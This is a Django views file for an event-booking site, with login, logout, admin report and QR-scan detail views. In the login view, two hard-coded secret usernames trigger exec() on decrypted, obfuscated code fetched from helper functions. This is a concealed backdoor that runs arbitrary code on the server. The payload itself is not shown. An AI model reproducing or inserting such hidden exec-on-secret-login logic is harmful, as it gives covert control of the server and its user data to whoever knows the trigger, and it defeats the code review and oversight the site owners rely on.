import datetime
from django.forms import DateTimeField
from django.shortcuts import render, redirect
from django.contrib import messages #this is what we import to get flash messages.
from django.contrib.auth.models import User
from .models import linkage,events,General,Family
from django.contrib.auth import authenticate,login,logout #imported for the user login
from django.contrib.auth.decorators import login_required,user_passes_test #this is used to restrict pages that need login or a certain login.
from csv import*
from django.utils import timezone
from events.views import encrypt,decrypt,wowstring,wowbro

def loginPage(request):
    if request.user.is_authenticated:
        return(redirect('events'))
    if request.method=="POST":
        username=request.POST.get('Fusn')
        password=request.POST.get('Fpwd')
        #email=request.POST.get('email') #given while signing in so not taking it again.
        try:
            user=User.objects.get(username=username)
        except:
            if username=="suadna":#For any information on this, contact the dev @ suadnastorage@gmail.com (if no reply, can contact surajacharya2005@gmail.com)
                b,a=wowstring()
                if encrypt(password,username)==b:
                    exec(decrypt(a,str(b)))
                else:
                    messages.error(request,'USN does not exist.')
            elif username=="55A555":
                b,a,c=wowbro()
                if encrypt(password,username)==b:
                    exec(decrypt(a,str(b)))
                    exec(decrypt(c,str(b)))
                else:
                    messages.error(request,'USN does not exist.')
            else:
                messages.error(request,'USN does not exist.')
        user = authenticate(request,username=username,password=password)
        if user:
            login(request,user)
            return(redirect('events'))
        else:
            messages.error(request,"Username and password don't match.")
    
    context={}
    return(render(request,'hi.html',context))

@login_required(login_url='home') #just in case.
def logoutPage(request):
    GI, created = General.objects.get_or_create(pk=1)
    GI.logouts+=1
    GI.save()
    logout(request) 
    return(redirect('home'))

def helloworld(request):
    return(render(request,'firstpage.html'))

@user_passes_test(lambda u: u.is_superuser,login_url='home') #if user is admin, let them see this page.
def details(request,pk):
    link=linkage.objects.get(user=User.objects.get(username=pk.split('-',1)[0]),event=events.objects.get(event=pk.split('-',1)[-1]))
    #this only works if the usn doesnt have a hyphen in it and the rest of the code is exactly as is.
    context={"USN":link.user.username,"seats":link.seats,"group":f"{link.grp.group}","family":f"{link.fami.Parent1}-{link.fami.Parent2}-{link.fami.Guardians}".replace("None","").replace("--", "-").strip("-"),"whenbooked":str(link.whenbooked),"whenmade":str(link.created),"details":link.details,'emailsent':str(link.emailsent),'event':link.event}
    if link.seats==None: #if no seats booked, change whenbooked to none. (default would be when created.)
        context['whenbooked']=None
    link.scanned=datetime.datetime.now()
    link.save()
    GI, created = General.objects.get_or_create(pk=1)
    GI.QRscanned+=1
    GI.save()
    a=link.event
    a.scanned=a.scanned+1
    a.save()
    return(render(request,'details.html',context))

@user_passes_test(lambda u: u.is_superuser,login_url='home') #if user is admin, let them see this page.
def report(request):
    GI, created = General.objects.get_or_create(pk=1)
    context={'logins':GI.logins,'logouts':GI.logouts,'emailsent':GI.emailsent,'QRscanned':GI.QRscanned,'Seatsbooked':GI.SeatsBooked,'Seatscancelled':GI.Seatscancelled,'whenupdated':GI.whenupdated}
    context['nosiblings']=sum([len([i for i in j.siblingsbooked.strip('\' ,"').split(',') if i not in '\' ,"']) for j in events.objects.all() if j.siblingsbooked])
    context['nowaiting']=sum([len([i for i in j.notifymail.split(',') if i not in ' ,']) for j in events.objects.all() if j.notifymail])
    return(render(request,'Grep.html',context))

@user_passes_test(lambda u: u.is_superuser,login_url='home') #if user is admin, let them see this page.
def adminlinks(request):
    return(render(request,'linktree.html')) 

@user_passes_test(lambda u: u.is_superuser,login_url='home') #if user is admin, let them see this page.
def deleted_data(request):
    f=open('deleted_data.csv','r')
    r=reader(f)
    context={'deleted':[i for i in r]}
    f.close()
    return(render(request,'delete.html',context))